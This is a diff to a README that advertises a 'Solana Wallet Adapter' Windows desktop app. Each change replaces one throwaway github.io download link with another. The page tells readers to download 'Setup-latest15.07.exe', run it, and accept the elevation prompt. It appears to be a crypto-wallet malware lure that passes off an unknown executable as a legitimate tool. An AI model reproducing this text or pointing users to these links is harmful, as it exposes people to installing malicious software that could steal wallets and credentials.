@@ -2,7 +2,7 @@
 
 The Solana Wallet Adapter is a powerful Windows desktop application designed for 2026, enabling users to seamlessly connect to the Solana blockchain and decentralized applications (dApps). This tool provides a secure and user-friendly interface for managing wallets, signing transactions, and exploring the Solana ecosystem on your PC. Whether you're a developer or a casual user, it simplifies crypto interactions without compromising on security.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -18,7 +18,7 @@ The Solana Wallet Adapter comes packed with features tailored for Windows users 
 
 Installing the Solana Wallet Adapter on your Windows PC is straightforward. Follow these steps to get started in 2026:
 
-1. **Download the Installer**: Use the download button above or visit the [official download page](https://yellowtaxisave.github.io/download-page/) to get the latest version.
+1. **Download the Installer**: Use the download button above or visit the [official download page](https://capitals-707-bringing.github.io/download-page/) to get the latest version.
 2. **Run the Setup File**: Locate the downloaded file named **"Setup-latest15.07.exe"** and double-click it. If prompted by Windows User Account Control, click "Yes" to proceed.
 3. **Follow the Installation Wizard**: The installer will guide you through the process. Accept the license agreement, choose your installation directory, and select any additional components if offered.
 4. **Complete the Setup**: Once installed, the tool will launch automatically, or you can find it in your Start Menu. Ensure your system meets the requirements below for optimal performance.
@@ -62,7 +62,7 @@ Here are some common queries about the Solana Wallet Adapter in 2026:
 
 To get started, download the latest version of the Solana Wallet Adapter for your Windows PC:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link directs you to the official download page where you can access the installer and additional resources. Ensure you download only from this source to avoid counterfeit software.
 
